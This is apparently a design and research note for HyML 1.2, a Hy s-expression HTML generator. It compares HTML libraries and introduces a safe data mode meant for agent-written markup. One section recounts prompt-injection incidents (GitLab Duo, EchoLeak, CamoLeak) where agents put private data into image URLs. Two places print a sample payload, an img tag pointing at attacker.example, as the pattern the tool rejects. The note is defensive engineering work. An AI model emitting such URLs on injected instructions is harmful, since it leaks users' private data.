# Background research

Research done on 2026-10-12 for HyML 1.2. It covers where HyML fits among HTML
generators, what LLM agents need from a markup renderer, and what the new safe
data mode adds. Star and download counts were read from GitHub, PyPI statistics and
Clojars on that date. Library behaviour marked *tested* was checked locally on
CPython 3.12. See also [performance.md](performance.md).

## What HyML is for

HyML writes HTML and XML as Hy s-expressions:

```hy
(html5 (ul :class "todo" (li "one") (li (a :href "/x" "two"))))
; <ul class=todo><li>one<li><a href=/x>two</a></ul>
```

It has three ways to render:

| Way | Input | Evaluates code | Use |
|---|---|---|---|
| `ml`, `xml`, `html5` … macros | Hy source | yes, `~` and `~@`, at compile time | static parts of pages written in Hy |
| `hyml.render` | HyML text | yes, at run time | templates you write yourself |
| `hyml.render_data` (new in 1.2) | s-expression text, JSON Hiccup, quoted Hy | **never** | markup from users and LLM agents |

All three check tag names against the HTML4 or HTML5 element sets and apply the
WHATWG rules for optional end tags and, in the `-min` dialects, start tags. In
the benchmark pages that made the output 18-22 % smaller than the same markup
with every tag closed.

## Python HTML generators in 2026

| Library | Approach | Escapes text by default | Blocks `javascript:` URLs | Stars | Downloads/month |
|---|---|---|---|---:|---:|
| [htpy](https://htpy.dev) 26.5 | element objects, `el(attrs)[children]` | yes (tested) | no (tested) | 483 | 185k |
| [dominate](https://github.com/Knio/dominate) 2.9 | DOM objects and `with` blocks | yes (tested) | no (tested) | 1.8k | 2.0M |
| FastHTML FT (`fastcore.xml`) | function calls `Div(P("x"), cls="y")` | yes (tested) | no (tested) | 7.1k | 598k |
| [yattag](https://www.yattag.org) 1.16 | `with tag(...)` blocks | yes (tested) | no (tested) | 349 | 1.1M |
| airium 0.3 | `with a.div():` blocks | **no** for text (tested) | no (tested) | GitLab | 186k |
| [htmy](https://github.com/volfpeter/htmy), [ludic](https://github.com/getludic/ludic) | React-like components, t-strings | yes | not documented | 404, 892 | small |
| Jinja2 3.1 | text templates | only with `autoescape=True` | no | 11.8k | 534M (mostly as a dependency) |
| HyML 1.2 | s-expressions | macros: no (markup is trusted); data mode: yes | data mode: yes | 10 | small |

All of these escape (except airium) and none of them checks URLs or tag names.
That is reasonable for markup that developers write. It is not enough for markup
that a model writes from untrusted content.

The Lisp side has the same notation under other names: Clojure's
[Hiccup](https://github.com/weavejester/hiccup) (2.0, final in 2025, escapes by
default, about 30 million downloads), Racket and Scheme SXML, Common Lisp
Spinneret and cl-who, Janet's htmlgen. None of them validates tag names against
the HTML specification or applies the optional tag rules.

## Hy in 2026

Hy reached 1.0 on 2024-09-22 after twelve years. Since then: 1.1 (2025-05),
1.2 (2026-01), 1.3 (2026-05, t-strings, Python 3.9-3.15) and 1.3.1 (2026-07).
The repository has about 5,400 stars and the package about 41,000 downloads a
month. Hy's value is still Lisp macros with the whole Python ecosystem. HyML was
ported from Hy 0.13 to 1.x in October 2026 and now runs on Hy 1.0 through 1.3.

## LLM agents and HTML

Agents produce HTML all the time: answers rendered as Markdown or HTML, reports,
emails, pages in generative UI. In 2025-2026 the industry split into two camps:

1. **Constrain what the model may emit.** Google's
   [A2UI](https://github.com/google/A2UI) (announced 2025-12) and Vercel's
   [json-render](https://github.com/vercel-labs/json-render) let the model choose
   only components from a catalog, as JSON checked against schemas. The client
   renders native components.
2. **Isolate whatever the model emits.** [MCP Apps](https://blog.modelcontextprotocol.io/posts/2026-01-26-mcp-apps/)
   (official in 2026-01), MCP-UI, the OpenAI Apps SDK and Anthropic's artifacts run
   HTML in sandboxed iframes with a content security policy. The HTML is not
   checked, it is contained.

Neither covers plain static HTML that goes where there is no iframe and no
component renderer: emails, CMS fields, documentation, server-rendered pages,
Markdown pipelines.

### The exfiltration problem

Rendering model output is the most common way prompt injection turns into data
theft. An attacker hides instructions in content the agent reads, the agent puts
private data into a URL, and the page leaks it when the browser loads the URL:

- **GitLab Duo** (2025-05): hidden instructions made Duo encode private code into
  an `<img src>`. The fix limited images and links to GitLab's own hosts.
- **EchoLeak**, CVE-2025-32711 in Microsoft 365 Copilot (2025-06): zero-click
  exfiltration through Markdown images and links.
- **CamoLeak** in GitHub Copilot Chat (2025-08): one image per character through
  GitHub's own image proxy. GitHub mitigated it by turning off image rendering.

Simon Willison calls the combination of private data, untrusted content and an
exfiltration channel the "lethal trifecta". Rendering is the channel.

### Sanitizers

[bleach](https://github.com/mozilla/bleach) is no longer maintained (archived
2026-06). Its successors are [nh3](https://github.com/messense/nh3) (Rust
ammonia, 34M downloads a month) and [justhtml](https://github.com/EmilStenstrom/justhtml).
They clean finished HTML by removing what is not allowed. Our comparison
(`benchmarks/security_compare.py`, results in [performance.md](performance.md))
found that **nh3 with its defaults keeps `<img src="https://attacker.example/log?d=SECRET">`**,
the exact pattern of the incidents above. justhtml removes it. Neither removes a
link that carries data in its URL, because that needs a click.

### Token cost of formats

The research agent counted one product-card fragment with an OpenAI tokenizer
(o200k): minimized HTML 106 tokens, HyML s-expression 116, compact JSON Hiccup
132, HTML with all end tags 137, and a verbose JSON tree
(`{type, tag, attributes, children}`) 448. Independent studies of compact formats
(TOON, 2026) found that formats models know well are more reliable than new
compact ones. We found no study of how reliably models write s-expressions.
Our field test (in [performance.md](performance.md)) adds one data point.

### MCP servers for markup

The registries have W3C validator wrappers, servers that take raw HTML and serve
it, and sanitizers that strip HTML after the fact. We found none that takes
markup as data (Hiccup or s-expressions) and returns safe, spec-checked HTML or a
precise list of problems.

## What the safe data mode adds

`hyml.render_data` takes markup from an untrusted source as data and renders it,
or refuses it with every problem listed:

```python
>>> hyml.render_data('(p "Hi" (img :src "https://attacker.example/log?d=SECRET"))')
HyMLDataError: 1 problem in markup data:
- p > img[2]: src='https://attacker.example/log?d=SECRET' loads an external resource
  without a click, which can leak data. Use a relative URL, or allow the host with
  allowed_url_hosts
```

1. **Nothing is evaluated.** Text is read by a small reader of its own that only
   knows parentheses, strings, symbols, numbers, keywords and comments. `~`, `'`,
   `` ` `` and `#` are reported as code. Tag names that mean code in HyML
   (`unquote`, `quote` …) are rejected, and the renderer refuses evaluation while
   rendering data.
2. **Refuse, don't strip.** Sanitizers remove things silently. Data mode lists
   every problem with its path (`html > body[2] > div[2] > script[1]`), so an agent
   can fix its markup in one round.
3. **Policy at construction.** In safe mode (the default) scripts, styles,
   iframes and other active elements, `on*` handlers, `style`, `srcdoc`,
   `http-equiv`, and URL schemes other than http, https, mailto and tel are
   rejected. Obfuscations such as `java&#9;script:` are seen through.
4. **No zero-click exfiltration by default.** URLs that load without a click
   (`src`, `srcset`, `poster`, `link href` …) must be relative, or point to hosts in
   `allowed_url_hosts`. Forms may not post to other hosts. With `allowed_url_hosts`
   set, links are limited to those hosts too.
5. **HTML specification.** Tag names are checked against HTML4 or HTML5, void
   elements cannot have content, and the output uses the optional tag rules.
6. **Limits.** `max_depth` and `max_nodes` bound the work for any input.
7. **One MCP tool.** `hyml-mcp` exposes it all as one tool, `render_html`. Its
   definition is 742 bytes, about 190 tokens. With `save_as` the page is written
   to a directory and only a short confirmation goes back to the model.

Already well covered elsewhere, and not claimed here: escaping by default,
allowlist sanitizing of finished HTML, component catalogs and sandboxing. The
JSON Hiccup input on its own could be built on nh3 or htpy in a few hundred
lines. What is new is the combination: evaluation-free s-expressions, spec
checking, URL and host policy, and errors written for an agent to act on.
